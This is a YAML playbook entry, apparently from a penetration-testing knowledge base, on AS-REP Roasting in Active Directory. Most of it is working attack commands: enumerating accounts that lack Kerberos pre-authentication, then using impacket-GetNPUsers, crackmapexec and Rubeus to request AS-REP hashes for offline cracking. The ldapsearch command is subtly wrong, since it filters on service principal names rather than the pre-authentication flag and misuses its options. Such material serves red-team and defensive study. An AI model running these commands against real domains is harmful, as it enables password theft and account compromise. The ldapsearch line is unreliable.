title: AS-REP Roasting Attack
category: 
  - AD:
    - Kerberos
    - Account Review
    
tactic: Initial Access
tags: []
description: |
  If "Do not require pre-authentication" flag is set to the account it makes it vulnerable for 
  AS-REP Roasting attack.
  
  In this attack, an attacker can send an authentication request (AS-REQ) to the KDC 
  on behalf of the user without providing an authenticator (encrypted timestampt). 
  The KDC will respond with an AS-REP message that includes a part, which is encrypted using the 
  user`s kerberos key (derived from user`s password or hash).

  The attacker can attempt to crack the encrypted part offline by guessing the user`s password.

references:
steps: 
  - description: Enumerate users with "Do not require pre-authentication" flag
    options: 
      - tool: powershell_ad_module
        usage: Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
        comments:

      - tool: powershell
        usage: |
          $root = [ADSI]"LDAP://dc=domain,dc=com"
          $search = new-Object System.DirectoryServices.DirectorySearcher($root)
          $search.Filter ="(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
          $search.FindAll()
        comments:

      - tool: powerview
        usage: |
          Get-DomainUser -PreauthNotRequired -verbose
        comments:
      
      - tool: ldapsearch
        usage:
          ldapsearch -x ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "DC=<domain,DC=com>" -b "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName userPrincipalName memberOf
        comments:

  - description: Request tickets
    options: 
      - tool: impacket
        usage: |
          #unauthenticated
          impacket-GetNPUsers domain.com/ -no-pass -usersfile ad_users.txt -outputfile hashes.asreproast

          #authenticated
          impacket-GetNPUsers domain.com/user:'P@ssw0rd' -request -format hashcat -outputfile hashes.asreproast
        comments: |
          it might be useful to ask just for specific users using "-usersfile usernames.txt" parameter instead of providing creds:
          impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile hashes.asreproast domain.com/

      - tool: crackmapexec
        usage: crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
        comments: 
      
      - tool: rubeus
        usage: Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
        comments: 

comments: >
  It worth checking if the DCs are vulnerable to RC4 AS-REP Decryption 
  (CVE-2022-33647, CVE-2022-33679) vulnerability. 


  